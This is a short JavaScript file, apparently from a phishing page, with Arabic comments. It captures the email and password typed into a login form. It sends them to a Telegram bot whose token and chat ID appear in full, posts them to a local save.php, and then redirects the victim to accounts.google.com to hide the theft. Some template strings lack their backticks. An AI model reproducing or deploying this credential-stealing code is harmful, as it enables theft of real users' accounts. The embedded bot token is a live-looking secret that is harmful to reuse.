document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email");
  const password = document.getElementById("password");

  if (!email || !password) {
    alert("الحقول غير موجودة!");
    return;
  }

  const emailValue = email.value;
  const passwordValue = password.value;

  const message = New Login:\nEmail: ${emailValue}\nPassword: ${passwordValue};

  // إرسال البيانات إلى تيليغرام
  fetch("https://api.telegram.org/bot7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: "7817453978",
      text: message
    })
  });

  // حفظ نسخة محليًا (لن يعمل على Vercel، يعمل فقط محليًا)
  try {
    fetch("save.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: email=${encodeURIComponent(emailValue)}&password=${encodeURIComponent(passwordValue)}
    });
  } catch (err) {
    console.log("Local save skipped:", err);
  }

  // إعادة توجيه المستخدم
  window.location.href = "https://accounts.google.com";
});
